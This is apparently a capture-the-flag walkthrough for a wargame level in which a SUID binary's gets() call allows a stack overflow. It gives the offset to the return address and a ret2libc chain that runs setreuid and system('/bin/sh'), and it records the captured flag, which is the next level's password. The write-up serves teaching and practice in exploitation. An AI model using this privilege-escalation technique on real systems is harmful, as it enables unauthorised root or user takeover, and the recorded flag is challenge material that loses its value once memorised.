# bonus04 — walkthrough

**Binary:** `/home/bonus04/matrix` (SUID `flagbonus04`) — **no source**
**Goal:** read `/home/flagbonus04/.pass`

## Recon
```
No PIE (0x400000), NX, **NO canary**, ASLR off. No setreuid in main.
main -> handle_input(): reads one command with gets().
```

## Bug
```c
char buf[...];        // at rbp-0x70
gets(buf);            // unbounded, NO canary -> straight to saved RIP (offset 120)
```
A key-value store (GET/SET); an unrecognized command just prints "Unknown
command" and `handle_input` returns — into our overwritten return address.

## Exploit
No canary and No-PIE + ASLR-off make this a plain ret2libc:
```
['A'*120][ setreuid(1031,1031) ; system("/bin/sh") ]
```
(movaps-aligned with a `ret`, command fed on stdin). This is the simplest of the
bonus set.

## Run
```
python3 exploit.py   ->   d2wlrk7cuuruus7iwfayjdjaiwagj7dl
```

**flagbonus04 = `d2wlrk7cuuruus7iwfayjdjaiwagj7dl`** (SSH password for bonus05)
